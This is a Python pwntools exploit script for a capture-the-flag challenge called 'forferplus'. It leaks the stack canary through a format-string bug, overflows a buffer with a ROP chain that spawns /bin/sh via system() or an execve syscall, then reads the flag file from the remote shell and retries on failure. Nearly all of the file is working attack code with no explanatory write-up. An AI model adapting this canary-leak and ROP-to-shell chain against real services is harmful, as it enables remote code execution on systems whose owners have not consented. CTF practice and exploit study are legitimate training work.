#!/usr/bin/env python3
from pwn import *
import re
import argparse
import time

context.clear(arch='amd64', os='linux')
context.log_level = 'info'

BIN_PATH = os.path.join(os.path.dirname(__file__), 'share', 'forferplus')
elf = ELF(BIN_PATH)
rop = ROP(elf)

HOST = os.environ.get('HOST', '127.0.0.1')
PORT = int(os.environ.get('PORT', '14505'))
DEFAULT_TIMEOUT = float(os.environ.get('TIMEOUT', '6'))
ENV_INTERACTIVE = os.environ.get('INTERACTIVE', '0').lower() in ('1', 'true', 'yes')

# 小連線探測某个參數索引的值（避免長格式覆蓋 canary）
def probe_idx(n: int):
    try:
        io = remote(HOST, PORT)
        io.recvuntil(b'Tell me your secret:')
        fmt = f"%{n}$p".encode()
        # 確保長度 <= 23 bytes（secret[8]+s[16] 前不觸及 canary）
        assert len(fmt) <= 23
        io.sendline(fmt)
        io.recvuntil(b'Your secret:')
        line = io.recvline().strip()
        io.close()
        if line.startswith(b'0x'):
            try:
                val = int(line[2:], 16)
                return val
            except Exception:
                return None
        return None
    except Exception:
        return None

def leak_canary(io):
    io.recvuntil(b'Tell me your secret:')
    # 單次、短長度（23 bytes）同時嘗試 4 個常見索引，避免覆寫到 canary
    fmt = b'%9$p.%10$p.%11$p.%12$p'
    assert len(fmt) <= 23
    io.sendline(fmt)
    io.recvuntil(b'Your secret:')
    line = io.recvline().strip()
    log.info(b'leaks: ' + line)
    toks = line.split(b'.')

    def to_val(tok: bytes):
        if tok == b'(nil)':
            return None
        if tok.startswith(b'0x'):
            try:
                return int(tok[2:], 16)
            except Exception:
                return None
        return None

    cands = [to_val(t) for t in toks]
    can = None
    for v in cands:
        if v and (v & 0xff) == 0 and (v >> 40):
            can = v
            break
    if can is None:
        log.warning('Canary not found in %9..%12 set')
    else:
        log.success(f'canary = {hex(can)}')
    return can


def build_chain():
    chain = ROP(elf)
    # try the easy way first: system('/bin/sh') if both exist
    try:
        binsh = next(elf.search(b'/bin/sh\x00'))
        log.info(f"/bin/sh found at {hex(binsh)}")
    except StopIteration:
        binsh = None
        log.info('No /bin/sh string in binary')

    system_addr = elf.symbols.get('system') or elf.plt.get('system')
    if system_addr and binsh:
        chain.call(system_addr, [binsh])
        return chain

    # robust fallback: write '/bin/sh\x00' then do execve via syscall
    bss = elf.bss() + 0x800
    read_addr = elf.symbols.get('read') or elf.plt.get('read')
    assert read_addr is not None, 'read not found in binary'
    chain.call(read_addr, [0, bss, 8])  # write '/bin/sh\x00' into memory

    # collect gadgets
    r = ROP(elf)
    def gg_try(seq):
        try:
            return r.find_gadget(seq).address
        except Exception:
            return None

    pop_rdi = gg_try(['pop rdi', 'ret'])
    pop_rsi = gg_try(['pop rsi', 'ret'])
    pop_rax = gg_try(['pop rax', 'ret'])
    # rdx gadget candidates with trailing rets and extra pops tracked
    rdx_cands = [
        (['pop rdx', 'ret'], 0),
        (['pop rdx', 'pop rbx', 'ret'], 1),
        (['pop rdx', 'pop rcx', 'ret'], 1),
        (['pop rdx', 'pop r12', 'ret'], 1),
        (['pop rdx', 'pop r13', 'ret'], 1),
        (['pop rdx', 'pop r14', 'ret'], 1),
        (['pop rdx', 'pop r15', 'ret'], 1),
    ]
    pop_rdx = None
    rdx_extra = 0
    for seq, extra in rdx_cands:
        addr = gg_try(seq)
        if addr:
            pop_rdx = addr
            rdx_extra = extra
            break
    # syscall gadget
    syscall = gg_try(['syscall', 'ret']) or gg_try(['syscall'])

    assert pop_rdi and pop_rsi and pop_rax and pop_rdx and syscall, 'missing gadgets'

    # build execve('/bin/sh', 0, 0)
    chain.raw(p64(pop_rdi)); chain.raw(p64(bss))
    chain.raw(p64(pop_rsi)); chain.raw(p64(0))
    chain.raw(p64(pop_rdx)); chain.raw(p64(0))
    for _ in range(rdx_extra):
        chain.raw(p64(0))
    chain.raw(p64(pop_rax)); chain.raw(p64(59))  # __NR_execve
    chain.raw(p64(syscall))

    chain.bss_target = bss
    return chain


def extract_flag(buf: bytes) -> bytes | None:
    # 優先匹配 is1abCTF{...}
    m = re.search(br'is1abCTF\{[^\r\n]*\}', buf)
    if m:
        return m.group(0)
    # 後備：任意 {..} 樣式（常見 CTF flag）
    m = re.search(br'[A-Za-z0-9_]+\{[^\r\n]*\}', buf)
    if m:
        return m.group(0)
    return None


def exploit(io, *, timeout: float = DEFAULT_TIMEOUT, interactive: bool = ENV_INTERACTIVE):
    canary = leak_canary(io)
    io.recvuntil(b'One chance to get my secret:')

    chain = build_chain()

    # layout for read into s: s[16] -> secret[8] -> canary 8 -> saved rbp 8 -> ret
    payload = b'A' * 16
    payload += b'X' * 8  # skip over secret[8]
    if canary is not None:
        payload += p64(canary)
    else:
        payload += b'\x00' * 8
    payload += b'B' * 8  # saved rbp

    # optional stack alignment
    try:
        ret = rop.find_gadget(['ret']).address
        payload += p64(ret)
    except Exception:
        pass

    payload += chain.chain()

    io.send(payload)

    if getattr(chain, 'bss_target', None) is not None:
        io.send(b'/bin/sh\x00')

    if interactive:
        io.interactive()
        return None

    # 非互動：確認殼，嘗試取 flag，最後關閉連線
    try:
        io.sendline(b'echo READY')
        data = io.recvuntil(b'READY', timeout=timeout)
        if b'READY' in data:
            log.info('Shell up (READY). Trying to read flag...')
            io.sendline(b'cat /home/chal/flag 2>/dev/null || cat ./flag 2>/dev/null || cat /flag 2>/dev/null')
            io.sendline(b'echo FLAGDONE')
            out = io.recvuntil(b'FLAGDONE', timeout=timeout)
            flag = extract_flag(out)
            if flag:
                log.success(f'FLAG: {flag.decode(errors="ignore")}')
                return flag
            else:
                log.warning('Flag not found in output.')
        else:
            log.warning('No READY marker seen before timeout.')
    except EOFError:
        log.warning('Connection closed by remote.')
    except Timeout:
        log.warning('Timed out waiting for READY/FLAGDONE.')
    finally:
        try:
            io.close()
        except Exception:
            pass
    return None


def main():
    parser = argparse.ArgumentParser(description='Exploit for forferplus')
    parser.add_argument('--host', default=HOST)
    parser.add_argument('--port', type=int, default=PORT)
    parser.add_argument('--timeout', type=float, default=DEFAULT_TIMEOUT, help='seconds to wait before auto-exit')
    parser.add_argument('--interactive', action='store_true', help='drop into interactive shell after exploit')
    parser.add_argument('--once', action='store_true', help='run once and exit (no auto-retry)')
    parser.add_argument('--tries', type=int, default=int(os.environ.get('MAX_TRIES', '0')), help='max attempts, 0=infinite')
    args = parser.parse_args()

    if args.interactive:
        io = remote(args.host, args.port)
        exploit(io, timeout=args.timeout, interactive=True)
        return

    attempt = 0
    while True:
        attempt += 1
        log.info(f'Attempt #{attempt}')
        try:
            io = remote(args.host, args.port)
            flag = exploit(io, timeout=args.timeout, interactive=False)
            if flag:
                print(flag.decode(errors='ignore'))
                break
        except Exception as e:
            log.warning(f'Attempt failed: {e}')
        finally:
            try:
                io.close()
            except Exception:
                pass
        if args.once:
            break
        if args.tries and attempt >= args.tries:
            log.warning('Max tries reached, exiting.')
            break
        time.sleep(0.3)

if __name__ == '__main__':
    main()
